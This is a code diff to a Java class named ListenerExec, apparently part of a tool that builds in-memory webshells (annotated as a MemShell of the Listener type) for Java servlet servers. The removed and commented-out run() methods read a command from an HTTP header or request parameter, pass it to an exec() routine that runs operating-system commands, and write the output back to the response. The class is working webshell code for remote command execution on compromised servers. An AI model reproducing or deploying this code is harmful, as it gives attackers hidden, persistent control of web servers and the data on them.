@@ -14,9 +14,10 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Runtime)
-@JavaClassModifiable(JavaClassModifiable.HEADER)
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
 public class ListenerExec implements InvocationHandler {
     private static String HEADER;
+    private static String PARAM;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
@@ -25,8 +26,11 @@ public class ListenerExec implements InvocationHandler {
         return null;
     }
 
-    public Object getResponse(Object httpServletRequest) throws Exception{
+    public Object getResponse(Object httpServletRequest) throws Exception {
         return null;
+    }
+
+    private void run(Object sre) {
     }
 
     /**
@@ -37,23 +41,26 @@ public class ListenerExec implements InvocationHandler {
 //        Object httpServletResponse = getFieldValue(request, "response");
 //        return httpServletResponse;
 //    }
-
-    private void run(Object sre) {
-        try {
-            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
-            String value = (String) invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            if (value == null) {
-                return;
-            }
-            String result = exec(value);
-            Object response = getResponse(httpServletRequest);
-            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
-            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-        } catch (Throwable ignored) {
-
-        }
-    }
-
+//    private void run(Object sre) {
+//        try {
+//            Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
+//            Object header =  invokeMethod(httpServletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+//            Object param = invokeMethod(httpServletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+//            String str = null;
+//            if (header != null) {
+//                str = (String) header;
+//            } else if (param != null) {
+//                str = (String) param;
+//            }
+//            String result = exec(str);
+//            Object response = getResponse(httpServletRequest);
+//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
+//        } catch (Exception ignored) {
+//            ignored.printStackTrace();
+//        }
+//    }
     public static String exec(String str) throws Exception {
         String[] cmd;
         if (System.getProperty("os.name").toLowerCase().contains("win")) {
@@ -103,4 +110,11 @@ public class ListenerExec implements InvocationHandler {
         return method.invoke(obj, args);
     }
 
+//    public static String getHEADER() {
+//        return HEADER;
+//    }
+//
+//    public static String getPARAM() {
+//        return PARAM;
+//    }
 }
